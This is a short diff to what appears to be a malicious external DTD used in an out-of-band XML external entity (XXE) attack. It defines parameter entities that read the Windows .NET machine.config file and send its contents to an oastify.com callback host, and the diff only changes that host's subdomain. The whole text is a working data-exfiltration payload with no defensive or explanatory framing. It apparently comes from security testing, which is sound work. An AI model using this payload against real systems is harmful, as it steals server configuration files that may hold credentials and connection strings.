@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///C:/Windows/Microsoft.NET/Framework64/v4.0.30319/Config/machine.config">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://jk7z8vw2vnor48f0jp8hisfkobu4iv6k.oastify.com/?content=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://110hpddkc559lqwi07pzzaw25tbmzen3.oastify.com/?content=%file;'>">
 %eval;
 %exfiltrate;
